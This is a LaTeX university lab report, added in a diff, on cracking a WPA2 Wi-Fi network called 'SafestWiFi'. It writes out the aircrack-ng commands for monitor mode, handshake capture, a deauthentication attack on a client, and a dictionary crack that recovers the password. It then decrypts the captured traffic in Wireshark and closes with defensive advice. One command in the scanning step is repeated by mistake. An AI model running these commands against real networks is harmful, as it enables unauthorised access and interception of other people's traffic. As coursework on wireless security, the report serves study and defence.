@@ -1,0 +1,194 @@
+\documentclass[a4paper, 11pt]{article}          % Paper and font size
+\usepackage[english]{babel}                     % Language setting
+
+% Set margins
+\usepackage[top=2.5cm,bottom=2.5cm,left=2cm,right=2cm,marginparwidth=1.75cm]{geometry}
+
+% Load useful packages
+\usepackage{graphicx}                           % Graphics
+\usepackage{amsmath}                            % Math
+\usepackage{xcolor}                             % Link color
+\definecolor{custom-blue}{RGB}{0,99,166} 
+\usepackage{hyperref}
+\hypersetup{colorlinks=true, allcolors=custom-blue}
+\usepackage[default]{sourcesanspro}             % Load font
+\usepackage[T1]{fontenc}                        % Special characters
+\usepackage{fancyhdr}                           % Load header, footer package
+\usepackage{float}
+
+\usepackage{lastpage}                           % Footer note
+\usepackage{lipsum}                             % For dummy text
+
+\pagestyle{myheadings}                          % Own header
+\pagestyle{fancy}                               % Own style
+\fancyhf{}                                      % Clear header, footer
+
+\setlength{\headheight}{30pt}                   % Set header hight
+\renewcommand{\headrulewidth}{0.5pt}            % Top line
+\renewcommand{\footrulewidth}{0.5pt}            % Bottom line
+
+\fancyhead[L]{\includegraphics[width=3cm]{univienna-logo.eps}} % Header left
+\fancyhead[C]{}                                 % Header center
+\fancyhead[R]{University of Vienna}             % Header right
+\fancyfoot[L]{\textcopyright Matsas Mario, Zamishchak Ihor, Togizbayev Yernaz}         % Footer left
+\fancyfoot[C]{}                                 % Footer center
+\fancyfoot[R]{\thepage/\pageref{LastPage}}      % Footer right
+
+%%% Begin document %%%
+\begin{document}
+
+\begin{figure}                                  % Include Logo
+\flushleft
+\includegraphics[width=0.4\textwidth]{univienna-logo.eps}
+\end{figure}
+
+% Set title, author, date
+\title{Report - WiFi Cracking}
+\author{
+        }
+\date{\today{}, Vienna}
+
+\maketitle                                      % Include contents
+\tableofcontents
+
+\section{Stage 0}                              % sections Stage 0
+
+This section outlines the step-by-step process used to capture a WPA2 handshake from a wireless network and perform a dictionary-based password attack. The goal was to assess the vulnerability of networks protected by weak passphrases.
+
+\subsection{Checking Wireless Interface Mode}
+We started by identifying the current wireless interface mode using: `iwconfig` or `iw dev`. This helped us to determine whether the interface was in managed or monitor mode.
+
+
+\subsection{Killing Conflicting Processes}
+To avoid conflicts between network managers and the WPA supplicant, we used:
+\begin{verbatim}
+    sudo airmon-ng check kill
+\end{verbatim}
+
+
+\subsection{Enabling Monitor Mode}
+Next, we switched the wireless adapter to monitor mode using:
+
+\begin{verbatim}
+    sudo airmon-ng start wlan0
+\end{verbatim}
+This created the `wlan0mon` interface to sniff traffic.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.75\linewidth]{Screenshot_2025-03-31_17-13-42.png}
+    \caption{Kill processes/Start Monitor mode}
+    \label{fig:enter-label}
+\end{figure}
+
+
+\subsection{Scanning for Targets}
+With monitor mode enabled, we scanned for nearby Wi-Fi networks using:
+\begin{verbatim}
+    sudo airmon-ng start wlan0
+\end{verbatim}
+We identified the target network: "SafestWiFi", and noted its BSSID and channel (CH).
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.75\linewidth]{Screenshot_2025-03-31_17-14-16.png}
+    \caption{Scanning Wi-Fi networks}
+    \label{fig:enter-label}
+\end{figure}
+
+
+\subsection{Capturing the Handshake}
+To begin capturing authentication packets, the following command was executed:
+\begin{verbatim}
+    sudo airodump-ng -w handshake -c 1 --bssid C0:4A:00:38:EC:AF wlan0mon
+\end{verbatim}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.75\linewidth]{Screenshot_2025-03-31_17-14-40.png}
+    \caption{Capturing handshake data}
+    \label{fig:enter-label}
+\end{figure}
+
+
+\subsection{Forcing a Client to Reconnect}
+To capture the handshake faster, a connected device was forcefully disconnected:
+\begin{verbatim}
+    sudo aireplay-ng --deauth 5 -a C0:4A:00:38:EC:AF -c B8:27:EB:CD:3E:5B wlan0mon
+\end{verbatim}
+This caused a connected client to re-authenticate, generating the WPA2 handshake.
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.75\linewidth]{Screenshot_2025-03-31_17-13-04.png}
+    \caption{Sending deauth packets}
+    \label{fig:enter-label}
+\end{figure}
+
+
+\subsection{Cracking the Captured Handshake}
+After successfully capturing the handshake, a dictionary attack was launched:
+\begin{verbatim}
+    sudo aircrack-ng handshake-01.cap -w passwords.txt
+\end{verbatim}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.75\linewidth]{Screenshot_2025-03-31_17-14-54.png}
+    \caption{Running dictionary attack}
+    \label{fig:enter-label}
+\end{figure}
+
+\subsection{Crack Success}
+After testing 8,025 passwords, we successfully cracked the Wi-Fi password:
+\begin{verbatim}
+    KEY FOUND! [ shamrock ]
+\end{verbatim}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.75\linewidth]{Screenshot_2025-03-31_17-15-12.png}
+    \caption{Key found}
+    \label{fig:enter-label}
+\end{figure}
+
+
+\section{Stage 1}                              % sections Stage 1 
+In this stage, we analyze the captured Wi-Fi traffic using Wireshark to extract meaningful application-level data. After successfully obtaining a WPA2 handshake and the network password, the goal was to decrypt the captured packets and inspect HTTP requests.
+\subsection{Launching Wireshark}
+Wireshark was launched with elevated privileges to ensure it had access to the network interface and capture files:
+\begin{verbatim}
+    sudo wireshark handshake-01.cap &
+\end{verbatim}
+
+\subsection{Configuring WPA2 Decryption}
+To decrypt encrypted packets, Wireshark was configured with the known password:
+\begin{itemize}
+    \item Navigate to Edit → Preferences → Protocols → IEEE 802.11.
+    \item Enable the “Enable decryption” checkbox.
+    \item Click Edit under Decryption Keys, then click + to add a new key.
+    \item Use the following format: \texttt{wpa-pwd:shamrock:SafestWifi
+}
+\end{itemize}
+
+\subsection{Filtering HTTP Requests}
+After enabling decryption, the traffic was filtered to display only HTTP requests using the `http` filter. This revealed plaintext HTTP GET requests made by the client.
+
+\subsection{Inspecting the Payload}
+By right-clicking a relevant packet and selecting “Follow → HTTP Stream”, the full request URI was revealed. In this case, the client attempted to access:
+\begin{verbatim}
+    http://www.youtube.com/watch?v=dQw4w9WgXcQ
+\end{verbatim}
+
+\section{Conclusion}
+We managed to crack the Wi-Fi password, which turned out to be `\texttt{shamrock}` — ranked 1337 in common password lists. Since WPA2 is vulnerable to dictionary attacks and the password was pretty basic, it was relatively easy to break in. Switching to WPA3 and using a much stronger password would make this kind of attack much harder.
+\newline
+After decrypting the capture with the password, we were also able to see the full URL the client was visiting:
+\begin{verbatim}
+    http://www.youtube.com/watch?v=dQw4w9WgXcQ
+\end{verbatim}
+\newline
+This worked because the traffic was unencrypted (HTTP), so everything was visible once we had access. To avoid this, users should stick to HTTPS websites, and Wi-Fi providers could force secure connections or just upgrade their network security overall.
+
+
+%%% End document %%%
+\end{document}
